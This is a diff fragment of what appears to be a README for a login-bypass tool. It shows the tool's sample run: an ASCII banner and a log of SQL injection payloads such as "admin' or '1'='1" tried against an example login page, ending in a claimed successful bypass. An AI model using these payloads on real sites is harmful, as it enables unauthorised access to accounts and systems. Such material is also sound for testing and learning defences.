@@ -98,43 +98,26 @@ These payloads attempt to manipulate the backend SQL queries during authenticati
 ```bash
 
    _____          __  .__   __________                                    
-
   /  _  \  __ ___/  |_|  |__\______   \___.__.___________    ______ ______
-
  /  /_\  \|  |  \   __\  |  \|    |  _<   |  |\____ \__  \  /  ___//  ___/
-
 /    |    \  |  /|  | |   Y  \    |   \\___  ||  |_> > __ \_\___ \ \___ \ 
-
 \____|__  /____/ |__| |___|  /______  // ____||   __(____  /____  >____  >
-
         \/                 \/       \/ \/     |__|       \/     \/     \/ 
-
 
     Author: 0xgh057r3con
 
     Version: 1.0
 
-
 [*] Attempting authentication bypass on http://example.com/login
-
 [*] Page loaded successfully at http://example.com/login
-
 [*] Trying payload: or 1=1
-
 [*] Trying payload: or 1=1--
-
 [*] Trying payload: admin' --
-
 [*] Trying payload: admin' or '1'='1
-
 [*] Trying payload: admin' or 1=1--
-
 [*] Clicked on the login button using JavaScript.
-
 [*] Redirected to a potential dashboard page with payload.
-
 [*] Logout option detected. Access confirmed.
-
 [*] Browser will remain open for inspection.
 
 ```
